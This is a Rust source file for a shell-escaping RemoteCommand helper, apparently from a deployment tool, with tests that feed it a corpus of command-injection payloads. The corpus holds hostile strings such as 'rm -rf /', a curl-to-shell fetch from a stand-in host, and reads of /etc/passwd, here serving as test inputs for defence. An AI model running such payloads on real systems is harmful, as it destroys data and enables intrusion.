use std::borrow::Cow;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteCommand {
    template: &'static str,
    escaped_args: Vec<String>,
}

impl RemoteCommand {
    pub fn new(template: &'static str, args: Vec<String>) -> Self {
        let escaped_args = args
            .into_iter()
            .map(|a| shell_escape::unix::escape(Cow::Owned(a)).into_owned())
            .collect();
        Self {
            template,
            escaped_args,
        }
    }

    pub fn literal(template: &'static str) -> Self {
        Self {
            template,
            escaped_args: Vec::new(),
        }
    }

    fn placeholder_count(&self) -> usize {
        self.template.matches("{}").count()
    }

    pub fn render(&self) -> String {
        assert_eq!(
            self.placeholder_count(),
            self.escaped_args.len(),
            "RemoteCommand template {:?} has {} placeholders but {} arguments; \
             this is a Popush bug, not user input",
            self.template,
            self.placeholder_count(),
            self.escaped_args.len(),
        );
        let mut out = String::with_capacity(self.template.len() + 16);
        let mut args = self.escaped_args.iter();
        let mut rest = self.template;
        while let Some(idx) = rest.find("{}") {
            out.push_str(&rest[..idx]);
            out.push_str(args.next().expect("placeholder/arg count checked"));
            rest = &rest[idx + 2..];
        }
        out.push_str(rest);
        out
    }

    pub fn display(&self) -> String {
        self.render()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const CORPUS: &[&str] = &[
        "; rm -rf /",
        "$(whoami)",
        "`whoami`",
        "&& curl evil.sh | sh",
        "| tee /etc/passwd",
        "path with spaces",
        "path'with'quotes",
        "path\"with\"doubles",
        "newline\nembedded",
        "null\0byte",
        "~ and * and ?",
        "unicode: пуш, ｐｕｓｈ, ../../../etc",
        "$HOME and ${HOME}",
        ">/etc/passwd",
        "2>&1",
        "$IFS",
        "a\tb",
        "'; DROP TABLE sites;--",
        "\\",
        "${IFS}cat${IFS}/etc/passwd",
    ];

    fn unquote_single_word(rendered: &str) -> String {
        if !rendered.starts_with('\'') {
            return rendered.to_string();
        }
        let mut out = String::new();
        let bytes: Vec<char> = rendered.chars().collect();
        let mut i = 0;
        while i < bytes.len() {
            match bytes[i] {
                '\'' => {
                    i += 1;
                    while i < bytes.len() && bytes[i] != '\'' {
                        out.push(bytes[i]);
                        i += 1;
                    }
                    i += 1;
                }
                '\\' => {
                    if i + 1 < bytes.len() {
                        out.push(bytes[i + 1]);
                        i += 2;
                    } else {
                        i += 1;
                    }
                }
                other => {
                    out.push(other);
                    i += 1;
                }
            }
        }
        out
    }

    fn escaped_arg(payload: &str) -> String {
        let cmd = RemoteCommand::new("{}", vec![payload.to_string()]);
        cmd.render()
    }

    #[test]
    fn corpus_each_payload_is_an_inert_single_word() {
        for &payload in CORPUS {
            let arg = escaped_arg(payload);
            assert_eq!(
                unquote_single_word(&arg),
                payload,
                "payload {payload:?} did not round-trip; escaped {arg:?}"
            );
            assert_inert(&arg, payload);
        }
    }

    #[test]
    fn corpus_neutralised_in_single_arg_template() {
        for &payload in CORPUS {
            let cmd = RemoteCommand::new("cd {}", vec![payload.to_string()]);
            let rendered = cmd.render();
            assert!(
                rendered.starts_with("cd "),
                "template prefix corrupted by payload {payload:?}: {rendered:?}"
            );
            let arg = &rendered["cd ".len()..];
            assert_eq!(unquote_single_word(arg), payload);
            assert_inert(arg, payload);
        }
    }

    #[test]
    fn corpus_neutralised_in_every_position_of_multi_arg_template() {
        for &payload in CORPUS {
            let cmd = RemoteCommand::new(
                "cd {} && git checkout {} && echo {}",
                vec![
                    payload.to_string(),
                    payload.to_string(),
                    payload.to_string(),
                ],
            );
            let rendered = cmd.render();
            let esc = escaped_arg(payload);
            let expected = format!("cd {esc} && git checkout {esc} && echo {esc}");
            assert_eq!(rendered, expected, "payload {payload:?}");
        }
    }

    fn assert_inert(rendered: &str, payload: &str) {
        let payload_has = |m: char| payload.contains(m);
        let chars: Vec<char> = rendered.chars().collect();
        let mut in_single = false;
        let mut i = 0;
        while i < chars.len() {
            let c = chars[i];
            if in_single {
                if c == '\'' {
                    in_single = false;
                }
                i += 1;
                continue;
            }
            match c {
                '\\' => {
                    i += 2;
                    continue;
                }
                '\'' => {
                    in_single = true;
                }
                m @ (';' | '`' | '|' | '\n' | '$' | '>' | '&') if payload_has(m) => {
                    panic!("unescaped {m:?} originating from payload {payload:?} in {rendered:?}");
                }
                _ => {}
            }
            i += 1;
        }
        assert!(!in_single, "unterminated single quote in {rendered:?}");
    }

    #[test]
    fn benign_arg_is_not_over_quoted() {
        let cmd = RemoteCommand::new("cd {} && git pull", vec!["/srv/sterling-defence".into()]);
        assert_eq!(cmd.render(), "cd /srv/sterling-defence && git pull");
    }

    #[test]
    fn display_equals_render_for_honesty() {
        let cmd = RemoteCommand::new("cd {}", vec!["a b; c".into()]);
        assert_eq!(cmd.display(), cmd.render());
    }

    #[test]
    fn literal_has_no_placeholders() {
        let cmd = RemoteCommand::literal("docker compose ps --format json");
        assert_eq!(cmd.render(), "docker compose ps --format json");
    }

    #[test]
    #[should_panic(expected = "placeholders but")]
    fn mismatched_placeholder_count_panics_loudly() {
        let cmd = RemoteCommand::new("cd {} && rm {}", vec!["/srv".into()]);
        let _ = cmd.render();
    }

    #[test]
    fn empty_arg_is_quoted_not_dropped() {
        let cmd = RemoteCommand::new("test -d {}", vec![String::new()]);
        assert_eq!(cmd.render(), "test -d ''");
    }
}
